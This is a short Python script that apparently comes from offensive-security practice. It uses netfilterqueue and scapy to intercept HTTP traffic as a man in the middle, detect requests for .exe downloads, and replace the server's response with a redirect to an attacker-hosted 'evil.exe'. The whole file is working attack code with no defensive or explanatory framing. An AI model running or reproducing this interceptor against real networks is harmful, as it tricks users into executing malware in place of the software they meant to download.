#!/usr/bin/env python3

#Imports
import netfilterqueue
import scapy.all as scapy

def setload(packet, load):
            packet[scapy.Raw].load = load
            del packet[scapy.IP].len
            del packet[scapy.IP].chksum
            del packet[scapy.TCP].chksum
            return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if filetypeext.encode() in scapy_packet[scapy.Raw].load:
                print("EXE request.")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("Replacing file")
                modified_packet = setload(scapy_packet,  "HTTP/1.1 301 Moved Permanently\nLocation: http://10.10.10.6/evil.exe\n\n")
                packet.set_payload(bytes(modified_packet))
    packet.accept()

filetypeext = ".exe"
ack_list = []

#Main
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
